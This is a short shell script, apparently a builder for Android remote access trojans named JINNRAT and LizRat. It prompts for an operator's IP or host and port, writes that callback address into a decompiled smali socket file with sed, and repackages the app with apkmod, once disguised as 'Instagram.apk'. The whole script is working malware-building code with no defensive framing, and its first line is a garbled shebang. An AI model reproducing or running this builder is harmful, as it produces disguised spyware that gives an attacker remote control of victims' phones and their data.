#!/#!/usr/bin/env sh

smaliFile="smali_classes4/com/Liz0rd/lizrat/IOSocket.smali"

if [ -d $HOME/JINNRAT ]; then

    appPath="$HOME/JINNRAT/server/app/decompiled"
fi

read -p "✅ 🇮🇵/🇺🇷🇱/🇭🇴🇸🇹 : " host
read -p "✅ 🇵🇴🇷🇹 : " port

sed -i "s#http.*#http://$host:$port?model=\"#" $appPath/$smaliFile

apkmod -R -i "$appPath" -o ~/JINNRAT/app/Instagram.apk sh

smaliFile="smali/com/Liz0rd/lizrat/IOSocket.smali"

if [ -d $HOME/LizRat ]; then

    appPath="$HOME/LizRat/server/app/factory/decompiled"
fi

read -p "👽 🇮🇵/🇺🇷🇱/🇭🇴🇸🇹 : " host        
read -p "👽 🇵🇴🇷🇹 : " port

sed -i "s#http.*#http://$host:$port?model=\"#" $appPath/$smaliFile

apkmod -R -i "$appPath" -o ~/lizrat/lizRat.apk
